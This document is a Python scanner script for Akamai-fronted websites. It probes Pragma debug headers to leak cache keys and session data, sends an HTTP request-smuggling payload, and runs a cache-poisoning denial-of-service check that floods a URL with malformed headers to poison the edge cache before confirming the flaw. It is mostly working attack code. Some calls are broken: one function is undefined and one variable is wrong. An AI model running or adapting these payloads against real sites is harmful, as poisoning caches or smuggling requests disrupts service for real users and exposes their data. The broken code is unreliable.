#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import sys
import random
import traceback

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def akamai(url, s):
    """
       https://techdocs.akamai.com/edge-diagnostics/docs/pragma-headers
       akamai-x-get-nonces
       pragma_debug = [ "akamai-x-ew-debug-rp", "akamai-x-ew-onoriginrequest", "akamai-x-ew-onoriginresponse", "akamai-x-ew-onclientresponse"]
    """
    pragma_list = {
    "akamai-x-cache-on": "X-Cache",
    "akamai-x-cache-remote-on": "X-Cache-Remote",
    "akamai-x-check-cacheable": "X-Check-Cacheable",
    "akamai-x-get-true-cache-key": "X-True-Cache-Key", 
    "akamai-x-get-cache-key": "X-Cache-Key", 
    "akamai-x-serial-no": "X-Serial", 
    "akamai-x-get-request-id": "X-Akamai-Request-ID",
    "akamai-x-get-extracted-values": "X-Akamai-Session-Info",
    "akamai-x-get-ssl-client-session-id": "x-akamai-ssl-client-sid",
    "akamai-x-ew-debug": "X-Akamai-EdgeWorker",
    "akamai-x-ew-onclientrequest": "X-Akamai-EdgeWorker",
    "akamai-x-ew-debug-subs": "X-Akamai-EdgeWorker"
    }


    for pgl in pragma_list:
        header = {"Pragma": pgl}
        res = pragma_list[pgl]
        try:
            req = s.get(url, verify=False, headers=header, timeout=10)
            #print(req.headers)
            if pragma_list[pgl] in req.headers:
                print("\033[36m   - {} | H:{}\033[0m".format(url, header))
                print("   └── {}: {}".format(res, req.headers[res]))
        except:
            pass
    cpdos_akamai(url, s)
    

def req_smuggling(url, s):
    #https://medium.com/@jacopotediosi/worldwide-server-side-cache-poisoning-on-all-akamai-edge-nodes-50k-bounty-earned-f97d80f3922b
    #https://blog.hacktivesecurity.com/index.php/2022/09/17/http/
    headers = {
        "Connection": "Content-Length",
        }

    body = (
        "   \r\n\r\n"
        "   GET / HTTP/1.1\r\n"
        "   Host: www.example.com\r\n"
        "   X-Foo: x\r\n"
    )

    #print(body)
    res_main = s.get(url, verify=False, timeout=10)
    response = s.get(url, headers=headers, data=body, verify=False, timeout=10)

    if response.status_code > 500 and response.status_code != res_main.status_code:
        print(f'   └── {url} [{res_main.status_code} > {response.status_code}]\n     └── H {headers}\n     └── B {body}')


def cpdos_akamai(url, s):
    headers = [{'"': "1"}, {"\\":"1"}]
    url = "{}?aka_loop{}={}".format(url, random.randint(1, 100), random.randint(1, 100))
    al_response = False
    for h in headers:
        try:
            aka_loop = s.get(url, headers=h, verify=False, timeout=10)
            if aka_loop.status_code == 400:
                for al in aka_loop.headers:
                    if "no-cache" not in [aka_loop.headers[r] for r in aka_loop.headers]:
                        if "HIT" in aka_loop.headers[al]:
                            print("\033[33m └── INTERESTING BEHAVIOR\033[0m | Akamai Redirect Loop | \033[34m{}\033[0m | PAYLOAD: {}".format(url, header))
                            al_response = True
            if al_response:
                for x in range(10):
                    requests.get(url, headers=h, verify=False, timeout=10)
                aka_verif = requests.get(url, verify=False, timeout=10)
                if aka_verif.status_code == 400:
                    print("  \033[31m └── VULNERABILITY CONFIRMED\033[0m | Akamai Redirect Loop | \033[34m{}\033[0m | PAYLOAD: {}".format(url, h))
                    vuln_found_notify(url, h)
        except:
            print(" └── Error with this payload please check manually with this header: {}".format(h))


if __name__ == '__main__':
    url = sys.argv[1]
    s = requests.Session()
    akamai(url, s)